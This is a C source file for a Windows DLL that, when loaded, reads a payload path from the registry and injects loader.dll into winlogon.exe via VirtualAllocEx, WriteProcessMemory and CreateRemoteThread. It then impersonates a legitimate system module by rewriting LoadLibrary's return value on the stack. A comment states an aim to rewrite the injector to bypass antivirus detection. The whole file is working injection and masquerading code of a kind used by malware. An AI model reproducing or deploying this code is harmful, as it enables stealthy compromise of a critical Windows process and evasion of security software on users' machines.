/**
 * main.c
 * Injects a module into a process, then impersonates another module.
 *
 * © 2018 fereh
 */

#include <Windows.h>
#include <strsafe.h>
#include <psapi.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#include <stdlib.h>

#include "ntreg.h"
#include "override.h"
#include "helper.h"

#pragma comment (lib, "DbgHelp.lib")

// TODO: use another way to find call, not by index
#ifdef _DEBUG
#define DEFAULT_REMOTE_PROCESS_NAME L"injector-test.exe"
#define DEFAULT_MODULE_NAME L"loader.dll"

#define CALLER_FRAME_INDEX 8
#else
#define DEFAULT_REMOTE_PROCESS_NAME L"winlogon.exe"
#define DEFAULT_MODULE_NAME L"loader.dll"

#define CALLER_FRAME_INDEX 5
#endif

HANDLE OpenProcessByName(DWORD desiredAccess, BOOL inheritHandle, PCWSTR name);
BOOL GetStackFrame(DWORD index, STACKFRAME *frame);
BOOL __inline ImpersonateModule(PCWSTR modulePath);
BOOL __inline MapRemoteModule(HANDLE remoteProcess, PCWSTR modulePath);

BOOL CALLBACK DllMain(HMODULE moduleHandle, DWORD reason, PVOID reserved)
{
	HANDLE remoteProcess;
	HANDLE configKey;
	WCHAR modulePath[MAX_PATH];

	switch (reason)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(moduleHandle);

		// get injected module path
		NtRegOpenKey(
			&configKey,
			HKEY_CLASSES_ROOT,
			L"Installer\\Config",
			KEY_ATTRIBUTE_NORMAL);

		NtRegGetExpandString(
			configKey,
			L"LoaderPath",
			modulePath,
			sizeof(modulePath));
		
		if (!*modulePath)
		{
			GetCurrentModuleDirectory(sizeof(modulePath) / sizeof(WCHAR), modulePath);
			StringCbCatW(modulePath, sizeof(modulePath), L"\\" DEFAULT_MODULE_NAME);
		}

		CloseHandle(configKey);

		// inject module into remote process
		remoteProcess = OpenProcessByName(
			PROCESS_ALL_ACCESS,
			FALSE,
			DEFAULT_REMOTE_PROCESS_NAME);

		if (remoteProcess)
		{
			MapRemoteModule(remoteProcess, modulePath);
			CloseHandle(remoteProcess);
		}

		// impersonate legitimate module
#ifdef _DEBUG
		StringCbCopyW(modulePath, sizeof(modulePath), L"wbemess.dll");
#else
		GetModuleFileNameW(GetCurrentModuleHandle(), modulePath, sizeof(modulePath));
		StringCbCopyW(modulePath, sizeof(modulePath), GetPathFileName(modulePath));
#endif

		if (!ImpersonateModule(modulePath))
		{
			return FALSE;
		}

		break;

	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

BOOL MapRemoteModule(HANDLE targetProcess, PCWSTR modulePath)
{
	// NOTE: for dubugging only!
	// TODO: rewrite to bypasss AV detection

	DWORD pathSize = ((DWORD)wcslen(modulePath) + 1) * sizeof(WCHAR);
	PVOID pathBase;
	PVOID fLoadLibraryW;

	pathBase = VirtualAllocEx(
		targetProcess,
		0,
		pathSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	if (!WriteProcessMemory(
		targetProcess,
		pathBase,
		modulePath,
		pathSize,
		NULL))
	{
		return FALSE;
	}

	fLoadLibraryW = (PVOID)GetProcAddress(
		GetModuleHandleW(L"kernel32.dll"),
		"LoadLibraryW");

	if (!CreateRemoteThread(
		targetProcess,
		NULL,
		0,
		fLoadLibraryW,
		pathBase,
		0,
		NULL))
	{
		return FALSE;
	}

	return TRUE;
}

BOOL ImpersonateModule(PCWSTR path)
{
	STACKFRAME frameInfo;
	HMODULE realModule = LoadLibraryW(path);

	if (!realModule)
	{
		return FALSE;
	}

	if (!GetStackFrame(CALLER_FRAME_INDEX, &frameInfo))
	{
		return FALSE;
	}

	// change LoadLibrary return value to the real module
	OverrideReturn((PVOID)realModule, frameInfo.AddrFrame.Offset + sizeof(PVOID));

	return TRUE;
}

BOOL GetStackFrame(DWORD index, STACKFRAME *frame)
{
	if (frame == NULL) return FALSE;

	HANDLE processHandle = GetCurrentProcess();
	HANDLE threadHandle = GetCurrentThread();

	DWORD machineType;
	CONTEXT context;
	
	RtlCaptureContext(&context); // NOTE: XP+ on x86

#ifdef _M_X64
	machineType = IMAGE_FILE_MACHINE_AMD64;

	frame->AddrPC.Offset = context.Rip;
	frame->AddrStack.Offset = context.Rsp;
	frame->AddrFrame.Offset = context.Rbp;
#endif
#ifdef _M_IX86
	machineType = IMAGE_FILE_MACHINE_I386;

	frame->AddrPC.Offset = context.Eip;
	frame->AddrStack.Offset = context.Esp;
	frame->AddrFrame.Offset = context.Ebp;
#endif

	frame->AddrPC.Mode = AddrModeFlat;
	frame->AddrStack.Mode = AddrModeFlat;
	frame->AddrFrame.Mode = AddrModeFlat;


	if (!SymInitialize(processHandle, NULL, TRUE))
	{
		return FALSE;
	}

	for (DWORD i = 0; i < index; ++i)
	{
		if (!StackWalk(
			machineType,
			processHandle,
			threadHandle,
			frame,
			&context,
			NULL,
			SymFunctionTableAccess,
			SymGetModuleBase,
			NULL))
		{
			SymCleanup(processHandle);
			return FALSE;
		}

		if (frame->AddrPC.Offset == 0)
		{
			SymCleanup(processHandle);
			return FALSE;
		}
	}

	SymCleanup(processHandle);
	return TRUE;
}

HANDLE OpenProcessByName(DWORD desiredAccess, BOOL inheritHandle, PCWSTR name)
{
	PROCESSENTRY32W entry;
	HANDLE snapshot;

	entry.dwSize = sizeof(PROCESSENTRY32W);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (!Process32FirstW(snapshot, &entry))
	{
		return NULL;
	}

	do
	{
		if (_wcsicmp(entry.szExeFile, name) == 0)
		{
			CloseHandle(snapshot);
			return OpenProcess(desiredAccess, inheritHandle, entry.th32ProcessID);
		}

		entry.dwSize = sizeof(PROCESSENTRY32W);
	} while (Process32NextW(snapshot, &entry));

	CloseHandle(snapshot);

	if (GetLastError() != ERROR_NO_MORE_FILES)
	{
		return NULL;
	}

	SetLastError(ERROR_FILE_NOT_FOUND);
	return NULL;
}